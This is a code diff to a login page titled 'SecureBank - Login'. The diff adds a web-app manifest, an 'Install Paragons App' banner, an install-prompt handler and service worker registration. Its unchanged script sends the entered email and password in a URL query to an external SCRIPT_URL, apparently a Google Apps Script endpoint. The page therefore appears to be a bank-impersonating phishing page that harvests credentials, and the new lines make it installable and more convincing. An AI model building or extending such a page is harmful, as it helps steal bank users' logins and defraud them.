@@ -4,6 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SecureBank - Login</title>
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#FFD700">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
     <style>
         
         body {
@@ -112,6 +117,14 @@
 </head>
 <body>
 
+    <div id="installBanner" style="display:none; background: #1a1a1a; border: 1px solid #FFD700; padding: 15px; border-radius: 15px; margin: 20px; text-align: center;">
+    <p style="color: white; margin-bottom: 10px; font-size: 14px;">Install <b>Paragons App</b> for a better experience!</p>
+    <button id="installBtn" style="background: #FFD700; color: black; border: none; padding: 10px 20px; border-radius: 8px; font-weight: bold; cursor: pointer;">
+        Install Now
+    </button>
+</div>
+
+
     <div class="login-container">
 
       <div class="logo-wrapper">
@@ -181,16 +194,55 @@ fetch(`${SCRIPT_URL}?email=${email}&password=${password}`)
         });
 
 
-
-
-
     fetch(`${SCRIPT_URL}?email=${email}`, {
     method: 'GET',
     mode: 'cors', // Add this
     redirect: 'follow' //ensure it follows Google's redirect
 })
 
+let deferredPrompt;
+const installBanner = document.getElementById('installBanner');
+const installBtn = document.getElementById('installBtn');
+
+window.addEventListener('beforeinstallprompt', (e) => {
+    // Prevent the mini-infobar from appearing on mobile
+    e.preventDefault();
+    // Stash the event so it can be triggered later.
+    deferredPrompt = e;
+    // Update UI notify the user they can install the PWA
+    installBanner.style.display = 'block';
+
+    installBtn.addEventListener('click', () => {
+        // Hide the banner
+        installBanner.style.display = 'none';
+        // Show the install prompt
+        deferredPrompt.prompt();
+        // Wait for the user to respond to the prompt
+        deferredPrompt.userChoice.then((choiceResult) => {
+            if (choiceResult.outcome === 'accepted') {
+                console.log('User accepted the install prompt');
+            } else {
+                console.log('User dismissed the install prompt');
+            }
+            deferredPrompt = null;
+        });
+    });
+});
+
+// Hide the banner if the app is successfully installed
+window.addEventListener('appinstalled', () => {
+    installBanner.style.display = 'none';
+    console.log('PWA was installed');
+});
+
     </script>
+    <script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('sw.js')
+      .then(() => console.log("Service Worker Registered"));
+  }
+</script>
+
 
 </body>
 </html>
